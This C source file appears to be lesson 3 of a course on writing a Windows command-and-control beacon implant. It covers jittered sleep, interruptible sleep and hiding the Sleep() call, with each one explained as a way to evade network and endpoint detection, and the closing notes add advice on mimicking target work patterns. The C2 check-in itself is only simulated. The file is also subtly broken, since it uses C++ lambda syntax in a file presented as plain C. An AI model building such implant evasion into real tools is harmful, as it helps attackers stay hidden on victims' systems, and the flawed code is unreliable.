/*
 * ========================================
 * LESSON 03: Sleep Loop with Jitter
 * ========================================
 *
 * The sleep loop is the HEART of a beacon.
 *
 * It controls:
 * 1. How often the beacon checks in
 * 2. How predictable the check-ins are (jitter)
 * 3. How stealthy the beacon is
 *
 * WHY JITTER?
 * - Without jitter: Check-ins happen at exact intervals (60s, 60s, 60s)
 * - Easy to detect: Network monitoring sees regular pattern
 * - With jitter: Check-ins vary (53s, 68s, 61s, 49s, 72s)
 * - Harder to detect: Looks more like normal user activity
 *
 * ========================================
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

/*
 * ========================================
 * SLEEP CALCULATION FUNCTIONS
 * ========================================
 */

// Simple random number generator for jitter
DWORD GetRandomInRange(DWORD min, DWORD max) {
    if (min >= max) return min;
    return min + (rand() % (max - min + 1));
}

/*
 * Calculate sleep time with jitter
 *
 * Parameters:
 *   baseSleep    - Base sleep time in seconds
 *   jitterPercent - Jitter as percentage (0-100)
 *
 * Returns:
 *   Sleep time in MILLISECONDS (for Sleep() function)
 *
 * Example:
 *   baseSleep = 60 seconds
 *   jitterPercent = 20 (means +/- 20%)
 *
 *   Jitter range = 60 * 20 / 100 = 12 seconds
 *   Min sleep = 60 - 12 = 48 seconds
 *   Max sleep = 60 + 12 = 72 seconds
 *
 *   Random sleep between 48-72 seconds
 */
DWORD CalculateSleepWithJitter(DWORD baseSleep, DWORD jitterPercent) {
    // No jitter case
    if (jitterPercent == 0) {
        return baseSleep * 1000;
    }

    // Calculate jitter range in seconds
    DWORD jitterRange = (baseSleep * jitterPercent) / 100;

    // Calculate min and max sleep times
    DWORD minSleep = baseSleep - jitterRange;
    DWORD maxSleep = baseSleep + jitterRange;

    // Get random sleep time within range
    DWORD actualSleep = GetRandomInRange(minSleep, maxSleep);

    // Convert to milliseconds
    return actualSleep * 1000;
}

/*
 * ========================================
 * ADVANCED: INTERRUPTIBLE SLEEP
 * ========================================
 *
 * Problem: Sleep() blocks the entire thread
 * Solution: Break sleep into smaller chunks so beacon can:
 * - Check for termination signals
 * - Respond to urgent tasks
 * - Update configuration mid-sleep
 */

typedef struct {
    BOOL bShouldTerminate;
    BOOL bInterruptSleep;
} BEACON_STATE;

// Sleep in chunks, checking state periodically
BOOL InterruptibleSleep(DWORD totalMs, BEACON_STATE* state) {
    const DWORD CHUNK_MS = 1000;  // Check every 1 second
    DWORD remaining = totalMs;

    while (remaining > 0 && state && !state->bShouldTerminate) {
        // Check for interrupt
        if (state->bInterruptSleep) {
            printf("[!] Sleep interrupted!\n");
            state->bInterruptSleep = FALSE;
            return FALSE;  // Sleep was interrupted
        }

        // Sleep for chunk or remaining time, whichever is smaller
        DWORD sleepTime = (remaining > CHUNK_MS) ? CHUNK_MS : remaining;
        Sleep(sleepTime);
        remaining -= sleepTime;
    }

    // Return TRUE if completed full sleep, FALSE if terminated
    return (state == NULL || !state->bShouldTerminate);
}

/*
 * ========================================
 * DEMONSTRATION: BASIC SLEEP LOOP
 * ========================================
 */

void DemonstrateSleepWithJitter(void) {
    printf("========================================\n");
    printf("SLEEP WITH JITTER DEMONSTRATION\n");
    printf("========================================\n\n");

    DWORD baseSleep = 10;      // 10 seconds for demo (real: 60-300s)
    DWORD jitterPercent = 30;  // 30% jitter

    printf("[*] Base sleep: %d seconds\n", baseSleep);
    printf("[*] Jitter: %d%%\n", jitterPercent);

    DWORD jitterRange = (baseSleep * jitterPercent) / 100;
    printf("[*] Sleep range: %d - %d seconds\n\n",
           baseSleep - jitterRange,
           baseSleep + jitterRange);

    // Demonstrate 10 sleep calculations
    printf("Sleep calculations (showing variation):\n");
    for (int i = 0; i < 10; i++) {
        DWORD sleepMs = CalculateSleepWithJitter(baseSleep, jitterPercent);
        double sleepSec = sleepMs / 1000.0;
        printf("  #%d: %.2f seconds\n", i + 1, sleepSec);
    }

    printf("\n[*] Notice how each sleep time varies!\n\n");
}

/*
 * ========================================
 * DEMONSTRATION: INTERRUPTIBLE SLEEP
 * ========================================
 */

void DemonstrateInterruptibleSleep(void) {
    printf("========================================\n");
    printf("INTERRUPTIBLE SLEEP DEMONSTRATION\n");
    printf("========================================\n\n");

    BEACON_STATE state = {0};
    state.bShouldTerminate = FALSE;
    state.bInterruptSleep = FALSE;

    printf("[*] Starting 10-second interruptible sleep...\n");
    printf("[*] Sleep checks state every 1 second\n\n");

    // Start a background thread that will interrupt after 5 seconds
    // (In real code, this would be signal from C2 or event)
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)([](LPVOID param) -> DWORD {
            BEACON_STATE* s = (BEACON_STATE*)param;
            Sleep(5000);  // Wait 5 seconds
            printf("\n[!] Triggering interrupt...\n\n");
            s->bInterruptSleep = TRUE;
            return 0;
        }),
        &state, 0, NULL);

    // Try to sleep for 10 seconds (will be interrupted at 5s)
    DWORD start = GetTickCount();
    BOOL completed = InterruptibleSleep(10000, &state);
    DWORD elapsed = GetTickCount() - start;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    printf("[*] Sleep completed: %s\n", completed ? "YES" : "NO (interrupted)");
    printf("[*] Actual sleep time: %.2f seconds\n\n", elapsed / 1000.0);
}

/*
 * ========================================
 * DEMONSTRATION: BEACON MAIN LOOP
 * ========================================
 */

void DemonstrateBeaconLoop(void) {
    printf("========================================\n");
    printf("BEACON MAIN LOOP DEMONSTRATION\n");
    printf("========================================\n\n");

    BEACON_STATE state = {0};
    DWORD baseSleep = 5;       // 5 seconds for demo
    DWORD jitterPercent = 20;  // 20% jitter
    int checkInCount = 0;

    printf("[*] Starting beacon loop (will run 5 check-ins)\n");
    printf("[*] Base sleep: %d seconds, Jitter: %d%%\n\n", baseSleep, jitterPercent);

    // Main beacon loop (real beacons: while(1))
    while (checkInCount < 5 && !state.bShouldTerminate) {
        checkInCount++;

        printf("--- Check-in #%d ---\n", checkInCount);

        // Calculate sleep with jitter
        DWORD sleepMs = CalculateSleepWithJitter(baseSleep, jitterPercent);
        printf("[*] Sleeping for %.2f seconds...\n", sleepMs / 1000.0);

        // Sleep (interruptible version for production)
        DWORD startTime = GetTickCount();
        InterruptibleSleep(sleepMs, &state);
        DWORD actualSleep = GetTickCount() - startTime;

        // Simulated check-in
        printf("[*] Awake! (slept %.2f seconds)\n", actualSleep / 1000.0);
        printf("[*] [SIMULATED] Checking in to C2...\n");
        printf("[+] [SIMULATED] No tasks received\n\n");

        // In real beacon, here we would:
        // 1. Send HTTP request to C2
        // 2. Receive tasks (if any)
        // 3. Execute tasks
        // 4. Send results back
    }

    printf("[*] Beacon loop demonstration complete!\n\n");
}

/*
 * ========================================
 * ADVANCED: SLEEP OBFUSCATION
 * ========================================
 *
 * Problem: Sleep() is a suspicious API call in malware
 * Solution: Obfuscate sleep using various techniques
 */

void ObfuscatedSleep(DWORD milliseconds) {
    /*
     * TECHNIQUE 1: WaitForSingleObject on event that never signals
     *
     * Instead of: Sleep(5000);
     * Use: WaitForSingleObject(hEvent, 5000);
     *
     * Looks like waiting for legitimate event, but event never signals.
     */
    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    WaitForSingleObject(hEvent, milliseconds);
    CloseHandle(hEvent);

    /*
     * TECHNIQUE 2: Busy wait with checks
     *
     * Problem: Uses CPU (less stealthy)
     * Benefit: No Sleep() in call stack
     */
    // DWORD start = GetTickCount();
    // while ((GetTickCount() - start) < milliseconds) {
    //     // Optionally do something useful here
    //     if ((GetTickCount() - start) % 1000 == 0) {
    //         // Check state every second
    //     }
    // }

    /*
     * TECHNIQUE 3: WaitableTimer
     *
     * More advanced, uses kernel timer object
     */
    // HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    // LARGE_INTEGER dueTime;
    // dueTime.QuadPart = -10000LL * milliseconds;  // Negative = relative time
    // SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
    // WaitForSingleObject(hTimer, INFINITE);
    // CloseHandle(hTimer);
}

void DemonstrateObfuscatedSleep(void) {
    printf("========================================\n");
    printf("OBFUSCATED SLEEP DEMONSTRATION\n");
    printf("========================================\n\n");

    printf("[*] Normal Sleep(3000)...\n");
    DWORD start = GetTickCount();
    Sleep(3000);
    DWORD elapsed = GetTickCount() - start;
    printf("[+] Slept for %d ms\n\n", elapsed);

    printf("[*] Obfuscated sleep (WaitForSingleObject)...\n");
    start = GetTickCount();
    ObfuscatedSleep(3000);
    elapsed = GetTickCount() - start;
    printf("[+] Slept for %d ms\n\n", elapsed);

    printf("[*] Both achieve same result, but obfuscated version\n");
    printf("    hides the Sleep() API call!\n\n");
}

/*
 * ========================================
 * MAIN DEMONSTRATION
 * ========================================
 */

int main(void) {
    // Seed random number generator for jitter
    srand((unsigned int)time(NULL));

    printf("\n");
    DemonstrateSleepWithJitter();

    printf("\n");
    DemonstrateInterruptibleSleep();

    printf("\n");
    DemonstrateBeaconLoop();

    printf("\n");
    DemonstrateObfuscatedSleep();

    /*
     * KEY TAKEAWAYS:
     *
     * 1. JITTER IS CRITICAL
     *    - Makes network traffic irregular
     *    - Harder to detect with automated tools
     *    - Typical jitter: 10-50%
     *
     * 2. INTERRUPTIBLE SLEEP
     *    - Allows beacon to respond to urgent tasks
     *    - Check for termination signals
     *    - More responsive to operator commands
     *
     * 3. SLEEP OBFUSCATION
     *    - Hide Sleep() API from detection
     *    - Use alternative waiting mechanisms
     *    - Trade-offs: complexity vs stealth
     *
     * 4. OPERATIONAL CONSIDERATIONS
     *    - Longer sleep = more stealthy but less responsive
     *    - Shorter sleep = more responsive but noisier
     *    - Typical values: 60-300 seconds for stealthy ops
     *
     * REAL-WORLD IMPROVEMENTS:
     *
     * 1. Adaptive sleep:
     *    - Sleep longer during night/weekends
     *    - Sleep shorter during business hours
     *    - Match target organization's work patterns
     *
     * 2. Activity-based sleep:
     *    - Sleep less when user is active
     *    - Sleep more when system is idle
     *    - Blend with normal system behavior
     *
     * 3. Failure backoff:
     *    - If C2 unreachable, increase sleep time
     *    - Exponential backoff: 60s, 120s, 240s, etc.
     *    - Prevents beacon from hammering dead server
     *
     * NEXT LESSON:
     * - Implement HTTP check-in and task parsing
     */

    return 0;
}

/*
 * ========================================
 * COMPILATION & EXECUTION
 * ========================================
 *
 * Compile:
 *   cl.exe 03-sleep-loop.c
 *
 * Run:
 *   03-sleep-loop.exe
 *
 * Expected output:
 *   - Shows 10 different sleep times with jitter
 *   - Demonstrates interruptible sleep
 *   - Shows beacon loop with varying sleep times
 *   - Compares normal vs obfuscated sleep
 *
 * ========================================
 */
